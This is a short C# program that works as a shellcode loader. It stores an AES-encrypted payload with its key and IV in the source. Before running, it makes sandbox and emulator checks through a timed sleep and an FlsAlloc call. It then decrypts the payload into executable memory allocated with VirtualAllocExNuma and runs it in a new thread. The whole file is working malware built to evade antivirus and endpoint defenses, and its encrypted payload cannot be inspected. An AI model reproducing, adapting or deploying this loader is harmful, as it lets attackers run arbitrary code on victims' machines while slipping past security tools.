using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Run
{
    public class Code
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] decrypted;

                using (MemoryStream msDecrypt = new MemoryStream(encrypted))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            decrypted = msPlain.ToArray();
                        }
                    }
                }

                return decrypted;
            }
        }

        public static void Main()
        {
            byte[] encrypted = new byte[] {
0xe5,0x4c,0x17,0x52,0x2d,0x12,0x31,0xdd,0x69,0x63,0x38,0xd6,
0xd5,0x14,0x0f,0x39,0xa9,0xf0,0xa3,0xbb,0xd5,0x7e,0xe1,0x08,
0x57,0x39,0x98,0x7a,0x83,0xd3,0x2f,0x69,0x48,0xfe,0x7b,0x36,
0x5a,0x7e,0x74,0x62,0x05,0xd6,0x24,0xbe,0xe2,0x65,0x98,0x6a,
0xfc,0x2a,0x1d,0xc0,0x21,0x5f,0x26,0xc4,0x46,0xc4,0x62,0xae,
0x1b,0x98,0xed,0x1b,0x25,0x29,0x59,0x76,0x6f,0x22,0x53,0x55,
0xd6,0x69,0x89,0xeb,0x76,0x97,0x72,0x40,0xd0,0x21,0x93,0x4a,
0xcf,0x39,0xe0,0x18,0xaa,0x32,0x12,0xfe,0x17,0x51,0x73,0xb4,
0x4d,0x9c,0x41,0x4a,0x10,0xaa,0xce,0xe6,0xc8,0xe3,0x1d,0xc2,
0x09,0xf5,0x17,0x0a,0x15,0xab,0x19,0x2c,0xfc,0x4b,0xaf,0x22,
0x8b,0xc9,0xcb,0x6c,0xd0,0x42,0x72,0x3c,0x84,0x4a,0x9f,0x2c,
0x15,0x26,0xec,0xbd,0xc7,0xeb,0x27,0x12,0x6e,0x17,0x7d,0x3e,
0xa2,0xdd,0x1e,0xb4,0xfe,0xaf,0x0b,0x7a,0x67,0x39,0x1d,0x99,
0x16,0x51,0x70,0xe6,0x1a,0x8f,0x5d,0xfc,0x73,0x5a,0xfd,0x2e,
0x58,0x64,0x39,0x3c,0x5d,0xce,0x2b,0x49,0x68,0x62,0x0e,0xbb,
0x8d,0x4a,0xb9,0xcf,0x83,0x2a,0xab,0x60,0x4d,0x8a,0x18,0xe8,
0xfe,0xa6,0xc3,0xda,0x16,0x8a,0x97,0x6b,0x3a,0x53,0x69,0x61,
0xb1,0x50,0xfd,0xe7,0x27,0xf6,0xd8,0xfe,0xe8,0x18,0xac,0x1a,
0x8b,0xfc,0x38,0xa4,0x94,0x34,0x3e,0x15,0x27,0xab,0xb8,0x03,
0xcf,0xe9,0x7e,0xdf,0x1c,0x23,0xa4,0x00,0xa5,0x28,0x42,0x7e,
0x94,0x7d,0xb0,0x28,0xdc,0xc2,0xd1,0x24,0x94,0x1d,0x7f,0x2d,
0x62,0x31,0x97,0x78,0x90,0x94,0x8c,0xd5,0xe0,0xca,0x16,0xa4,
0x62,0x49,0x99,0x58,0x6d,0x32,0x41,0x4c,0x61,0xac,0xda,0x62,
0x4b,0xc7,0x6e,0xa5,0xf5,0xaf,0x7b,0x81,0xc9,0x39,0x50,0x96 };
            byte[] key = new byte[] {
0xa4,0xba,0xfe,0x5e,0x90,0xe0,0x8e,0xf8,0xfe,0x54,0x91,0x0b,
0x5c,0xc4,0x33,0x27,0x47,0x20,0xe6,0xe4,0x6b,0x0e,0xf8,0x43,
0xc3,0x08,0x32,0x92,0x1d,0x33,0x1b,0xda };
            byte[] iv = new byte[] {
0xb8,0x73,0xc8,0x0f,0x45,0xfb,0xfb,0x01,0x5e,0x3d,0xdd,0xb8,
0xb8,0xf2,0x2b,0x10 };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            

            byte[] decrypted = Decrypt(encrypted, key, iv);

            int size = decrypted.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(decrypted, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}